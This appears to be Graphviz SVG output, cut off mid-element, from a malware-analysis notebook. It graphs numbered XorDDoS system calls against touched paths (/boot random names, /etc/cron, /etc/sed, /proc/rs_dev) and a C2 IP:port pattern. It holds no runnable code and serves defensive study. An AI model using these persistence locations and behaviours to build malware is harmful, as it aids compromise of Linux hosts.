      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Title: Xorddos_asg_OPset Pages: 1 -->\n<svg width=\"5310pt\" height=\"291pt\"\n viewBox=\"0.00 0.00 5310.28 291.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 287)\">\n<title>Xorddos_asg_OPset</title>\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-287 5306.28,-287 5306.28,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2582.54\" cy=\"-265\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2582.54\" y=\"-261.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"167.54\" cy=\"-178\" rx=\"66.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"167.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/[a&#45;z]{10}</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.18,-263.68C2078.53,-261.84 31.03,-251.8 8.54,-229 -21.69,-198.36 36.89,-186.44 91.28,-181.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"91.66,-185.32 101.36,-181.06 91.12,-178.34 91.66,-185.32\"/>\n<text text-anchor=\"middle\" x=\"32.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.clone</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.27,-263.65C2085.93,-261.67 101.37,-251.14 79.54,-229 64.44,-213.69 83.88,-201.59 108.3,-193.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"109.38,-196.46 117.83,-190.07 107.24,-189.8 109.38,-196.46\"/>\n<text text-anchor=\"middle\" x=\"98.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.write</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.13,-263.62C2091.69,-261.52 161.8,-250.57 140.54,-229 133.33,-221.68 136.45,-212.05 142.69,-203.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"145.47,-205.32 149.09,-195.36 140.05,-200.89 145.47,-205.32\"/>\n<text text-anchor=\"middle\" x=\"157.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">26.rm</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.31,-263.91C2101.3,-263.29 247.49,-258.85 196.54,-229 187.54,-223.73 181.07,-214.5 176.56,-205.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"179.73,-203.9 172.54,-196.12 173.3,-206.69 179.73,-203.9\"/>\n<text text-anchor=\"middle\" x=\"216.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.01,-264.04C2113.52,-264.1 368.13,-262.48 258.54,-229 246.87,-225.43 246.09,-220.13 235.54,-214 226.59,-208.79 216.78,-203.51 207.46,-198.68\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"208.86,-195.47 198.36,-194.02 205.67,-201.7 208.86,-195.47\"/>\n<text text-anchor=\"middle\" x=\"284.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">55.stat64</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.15,-263.63C2123.11,-261.7 452.19,-251.98 344.54,-229 327.99,-225.47 325.59,-219.38 309.54,-214 283.5,-205.28 254.12,-197.68 228.87,-191.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"229.58,-188.38 219.05,-189.57 228.02,-195.21 229.58,-188.38\"/>\n<text text-anchor=\"middle\" x=\"364.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.open</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"548.54\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"548.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.17,-264.24C2120.67,-265.23 432.31,-267.38 394.54,-229 359.18,-193.07 448.94,-182.94 505.87,-180.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"506.24,-183.59 516.08,-179.65 505.93,-176.59 506.24,-183.59\"/>\n<text text-anchor=\"middle\" x=\"411.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.rm</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2504.97,-264.2C2126.15,-265.01 487.27,-266.34 450.54,-229 429.33,-207.44 471.86,-193.42 507.39,-185.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"508.52,-189.2 517.64,-183.81 507.15,-182.34 508.52,-189.2\"/>\n<text text-anchor=\"middle\" x=\"470.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.08,-264.16C2133.28,-264.76 548.12,-265.19 512.54,-229 503.67,-219.98 510.68,-208.62 520.79,-199.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"523.21,-201.54 528.52,-192.38 518.65,-196.23 523.21,-201.54\"/>\n<text text-anchor=\"middle\" x=\"538.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">54.stat64</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.25,-263.56C2143.12,-261.4 630.07,-251.07 586.54,-229 576.07,-223.69 567.69,-214.01 561.49,-204.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"564.35,-202.54 556.22,-195.75 558.34,-206.13 564.35,-202.54\"/>\n<text text-anchor=\"middle\" x=\"606.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.open</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.12,-263.79C2155.68,-262.72 738.55,-256.65 648.54,-229 636.87,-225.42 636.24,-219.88 625.54,-214 612.08,-206.6 596.76,-199.41 583.35,-193.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"584.54,-190.19 573.98,-189.41 581.75,-196.61 584.54,-190.19\"/>\n<text text-anchor=\"middle\" x=\"672.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.clone</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.15,-264.16C2177.05,-264.6 909.62,-264.03 734.54,-229 716.73,-225.44 713.86,-219.44 696.54,-214 660.6,-202.72 618.75,-193.14 588.74,-186.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"589.15,-183.38 578.65,-184.8 587.73,-190.24 589.15,-183.38\"/>\n<text text-anchor=\"middle\" x=\"753.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.write</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"846.54\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"846.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.12,-263.96C2164.08,-263.61 811.17,-260.23 780.54,-229 767.12,-215.32 785.57,-202.33 806.33,-193.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"807.73,-196.23 815.61,-189.14 805.03,-189.77 807.73,-196.23\"/>\n<text text-anchor=\"middle\" x=\"802.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.24,-263.89C2172.44,-263.22 877.24,-258.7 847.54,-229 841.6,-223.06 840.01,-214.48 840.32,-206.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"843.8,-206.49 841.49,-196.16 836.85,-205.68 843.8,-206.49\"/>\n<text text-anchor=\"middle\" x=\"887.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.23,-264.06C2203.57,-264.03 1114.81,-261.68 963.54,-229 959.28,-228.08 915.76,-209.27 883.03,-194.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"884.27,-191.71 873.7,-190.92 881.46,-198.13 884.27,-191.71\"/>\n<text text-anchor=\"middle\" x=\"994.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">66.connect</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1136.54\" cy=\"-178\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1136.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.36,-263.71C2195.93,-262.35 1060.5,-255.56 1034.54,-229 1014.06,-208.05 1051.68,-194.58 1086.88,-186.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1087.59,-190.39 1096.69,-184.97 1086.2,-183.53 1087.59,-190.39\"/>\n<text text-anchor=\"middle\" x=\"1057.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.lseek</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.26,-263.62C2204.59,-261.97 1128.24,-254.29 1103.54,-229 1095.51,-220.78 1100.56,-210.34 1108.89,-201.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1111.4,-203.58 1116.09,-194.08 1106.49,-198.58 1111.4,-203.58\"/>\n<text text-anchor=\"middle\" x=\"1126.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2504.94,-263.98C2218.16,-263.65 1231.71,-260.24 1172.54,-229 1162.5,-223.7 1154.6,-214.21 1148.79,-204.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1151.83,-203.17 1143.86,-196.19 1145.74,-206.61 1151.83,-203.17\"/>\n<text text-anchor=\"middle\" x=\"1195.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.write</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.05,-263.71C2239.16,-262.48 1373.47,-256.38 1251.54,-229 1235.42,-225.38 1232.68,-220.61 1217.54,-214 1203.64,-207.93 1188.38,-201.33 1174.89,-195.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1176,-192.17 1165.43,-191.42 1173.22,-198.59 1176,-192.17\"/>\n<text text-anchor=\"middle\" x=\"1280.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">48.rename</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1487.54\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1487.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/sed</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.1,-263.29C2233.9,-260.64 1342.25,-250.29 1321.54,-229 1284.64,-191.06 1376.74,-181.65 1438.04,-179.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1438.45,-182.97 1448.34,-179.17 1438.24,-175.97 1438.45,-182.97\"/>\n<text text-anchor=\"middle\" x=\"1352.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">47.fchmod</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.38,-263.14C2246.61,-260.07 1424.73,-248.77 1405.54,-229 1388.97,-211.93 1416.34,-198.36 1443.82,-189.68\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1444.88,-193.02 1453.47,-186.82 1442.89,-186.31 1444.88,-193.02\"/>\n<text text-anchor=\"middle\" x=\"1435.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">46.fchown</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.04,-264.41C2261.28,-265.32 1524.18,-265.07 1488.54,-229 1482.7,-223.09 1481.09,-214.62 1481.35,-206.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1484.86,-206.46 1482.52,-196.12 1477.91,-205.66 1484.86,-206.46\"/>\n<text text-anchor=\"middle\" x=\"1511.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.write</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.24,-263.96C2281.77,-263.49 1645.25,-259.44 1556.54,-229 1551.7,-227.34 1531.94,-212.87 1514.79,-199.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1516.75,-197.01 1506.67,-193.75 1512.51,-202.58 1516.75,-197.01\"/>\n<text text-anchor=\"middle\" x=\"1577.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.fstat</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2504.95,-264.41C2309.82,-264.9 1802.49,-262.8 1637.54,-229 1619.35,-225.27 1616.07,-220.13 1598.54,-214 1575.92,-206.09 1550.43,-198 1529.6,-191.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1530.36,-188.16 1519.77,-188.59 1528.31,-194.86 1530.36,-188.16\"/>\n<text text-anchor=\"middle\" x=\"1659.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.fcntl</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1882.54\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1882.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.2,-263.85C2293.03,-263.07 1715.66,-258.25 1687.54,-229 1682.92,-224.19 1683.26,-219.11 1687.54,-214 1707.21,-190.48 1794.09,-182.74 1845,-180.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1845.45,-183.7 1855.29,-179.75 1845.14,-176.71 1845.45,-183.7\"/>\n<text text-anchor=\"middle\" x=\"1724.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.22,-263.46C2309.69,-261.72 1809.2,-254.77 1784.54,-229 1762.69,-206.17 1810.01,-191.97 1846.23,-184.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1846.89,-188.21 1856.08,-182.93 1845.61,-181.33 1846.89,-188.21\"/>\n<text text-anchor=\"middle\" x=\"1807.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.6,-263.13C2322.77,-260.68 1875.76,-252.32 1853.54,-229 1845.45,-220.52 1850.78,-209.37 1858.96,-199.75\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1861.56,-202.1 1865.94,-192.45 1856.5,-197.26 1861.56,-202.1\"/>\n<text text-anchor=\"middle\" x=\"1872.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.22,-263.95C2339.97,-263.26 1963.34,-258.45 1913.54,-229 1904.4,-223.6 1897.58,-214.34 1892.69,-205.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1895.75,-203.53 1888.28,-196.01 1889.43,-206.54 1895.75,-203.53\"/>\n<text text-anchor=\"middle\" x=\"1939.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.09,-264.36C2366.41,-264.19 2081.4,-259.93 1987.54,-229 1975.95,-225.18 1975.3,-219.75 1964.54,-214 1948.75,-205.56 1930.49,-197.61 1915.21,-191.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1916.25,-188.06 1905.66,-187.62 1913.66,-194.57 1916.25,-188.06\"/>\n<text text-anchor=\"middle\" x=\"2010.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2506.25,-261.74C2384.35,-257.63 2151.17,-247.6 2070.54,-229 2053.25,-225.01 2050.46,-219.35 2033.54,-214 1994.81,-201.75 1949.26,-191.78 1918.39,-185.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1919.01,-182.21 1908.52,-183.73 1917.67,-189.08 1919.01,-182.21\"/>\n<text text-anchor=\"middle\" x=\"2093.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">59.write</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2225.54\" cy=\"-178\" rx=\"148.67\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2225.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">d{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.19,-263.69C2381.34,-262.38 2149.81,-256.27 2124.54,-229 2111.8,-215.25 2122.75,-204.78 2141.43,-197.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2142.66,-200.36 2150.83,-193.62 2140.24,-193.79 2142.66,-200.36\"/>\n<text text-anchor=\"middle\" x=\"2164.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">65._newselect</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2506.25,-261.79C2407.32,-258.13 2245.15,-249.12 2226.54,-229 2220.98,-222.99 2219.38,-214.64 2219.58,-206.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2223.07,-206.73 2220.62,-196.42 2216.11,-206.01 2223.07,-206.73\"/>\n<text text-anchor=\"middle\" x=\"2248.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">63.send</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2505.58,-262.79C2449.32,-259.87 2371.92,-251.56 2307.54,-229 2289.26,-222.59 2270.68,-211.7 2255.84,-201.72\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2257.77,-198.8 2247.56,-195.98 2253.79,-204.55 2257.77,-198.8\"/>\n<text text-anchor=\"middle\" x=\"2338.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">67.connect</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2479.54\" cy=\"-178\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2479.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2506.99,-260.96C2455.95,-257.14 2394.98,-248.51 2378.54,-229 2357.62,-204.18 2406.23,-190.53 2443.04,-184\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2443.75,-187.43 2453.04,-182.34 2442.6,-180.52 2443.75,-187.43\"/>\n<text text-anchor=\"middle\" x=\"2401.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2518.1,-254.94C2487.92,-249.25 2456.61,-240.73 2447.54,-229 2440.27,-219.61 2446.03,-208.55 2454.55,-199.22\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2457.07,-201.65 2461.79,-192.17 2452.18,-196.64 2457.07,-201.65\"/>\n<text text-anchor=\"middle\" x=\"2469.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2545.55,-249.03C2534.86,-243.67 2523.64,-236.95 2514.54,-229 2506.48,-221.97 2499.34,-212.71 2493.64,-204.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2496.5,-202.05 2488.24,-195.41 2490.56,-205.75 2496.5,-202.05\"/>\n<text text-anchor=\"middle\" x=\"2537.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2578.45,-246.86C2575.16,-236.24 2569.55,-222.96 2560.54,-214 2548.06,-201.6 2530.47,-193.28 2514.88,-187.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2515.58,-184.43 2504.99,-184.74 2513.46,-191.1 2515.58,-184.43\"/>\n<text text-anchor=\"middle\" x=\"2594.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">61.write</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2767.54\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2767.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2601.63,-247.47C2614.89,-236.69 2633.38,-223 2651.54,-214 2675.67,-202.04 2704.69,-193.29 2727.66,-187.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2728.53,-190.92 2737.43,-185.17 2726.88,-184.11 2728.53,-190.92\"/>\n<text text-anchor=\"middle\" x=\"2679.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2640.27,-252.94C2661.82,-247.48 2686.01,-239.71 2706.54,-229 2714.46,-224.87 2730.14,-211.97 2743.61,-200.31\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2745.99,-202.88 2751.22,-193.67 2741.39,-197.61 2745.99,-202.88\"/>\n<text text-anchor=\"middle\" x=\"2755.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2657.89,-260.82C2708.32,-256.93 2768.32,-248.27 2784.54,-229 2790.52,-221.89 2789.1,-212.57 2785.21,-203.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2788.13,-201.97 2780.24,-194.91 2782,-205.35 2788.13,-201.97\"/>\n<text text-anchor=\"middle\" x=\"2812.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">19.open</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.94,-264.24C2726.93,-262.6 2816.55,-255.33 2839.54,-229 2853.85,-212.6 2829.7,-198.92 2805.6,-190.04\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2806.69,-186.71 2796.09,-186.76 2804.4,-193.33 2806.69,-186.71\"/>\n<text text-anchor=\"middle\" x=\"2881.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2972.54\" cy=\"-178\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2972.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge42\" 